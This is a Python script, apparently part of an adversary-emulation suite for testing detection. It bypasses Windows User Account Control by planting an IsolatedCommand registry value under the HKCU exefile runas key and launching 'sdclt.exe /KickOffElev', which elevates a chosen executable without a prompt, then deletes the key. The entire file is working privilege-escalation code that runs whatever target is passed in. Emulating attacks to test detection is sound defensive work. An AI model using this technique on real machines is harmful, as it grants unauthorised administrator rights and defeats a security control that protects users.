# Name: Bypass UAC via Sdclt
# rta: uac_sdclt.py
# ATT&CK: T1088
# Description: Modifies the Registry to auto-elevate and execute mock malware.

import subprocess
import sys
import os
import _winreg as winreg
import common

# HKCU:\Software\Classes\exefile\shell\runas\command value: IsolatedCommand
# "sdclt.exe /KickOffElev" or children of sdclt.exe
# HKLM value: "%1" %*


def main(target_process=common.get_path("bin", "myapp.exe")):
    target_process = os.path.abspath(target_process)

    common.log("Bypass UAC via Sdclt to run %s" % target_process)
    hkey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\exefile\\shell\\runas\\command")

    key_name = "IsolatedCommand"
    common.log("Setting %s registry key" % key_name)
    winreg.SetValueEx(hkey, key_name, 0, winreg.REG_SZ, target_process)

    common.log("Running Sdclt to bypass UAC")
    common.execute([r"c:\windows\system32\sdclt.exe", "/KickOffElev"])
    
    common.log("Clearing registry keys", log_type="-")
    winreg.DeleteValue(hkey, "IsolatedCommand")
    winreg.DeleteKey(hkey, "")
    winreg.CloseKey(hkey)



if __name__ == "__main__":
    exit(main(*sys.argv[1:]))
